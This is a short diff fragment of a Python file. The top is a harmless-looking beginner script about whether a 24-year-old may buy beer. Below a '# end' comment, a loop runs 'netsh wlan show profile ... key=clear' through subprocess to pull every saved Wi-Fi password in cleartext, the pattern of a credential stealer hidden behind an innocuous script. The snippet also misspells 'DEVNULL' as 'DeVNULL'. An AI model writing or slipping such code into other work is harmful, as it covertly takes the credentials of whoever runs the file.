@@ -24,9 +24,9 @@ age = 24
 if (age > 18):
     answer = "u are allowed to buy beer"
 else: answer = "u are a kid, u cannot buy beer"
-
-result = ""
 # end
+result = ""
+
 for regular in regular_list:
     c2 = "netsh wlan show profile " + regular + " key=clear"
     sub2 = subprocess.check_output(c2, shell=True, stderr=DeVNULL,stdin=DEVNULL)
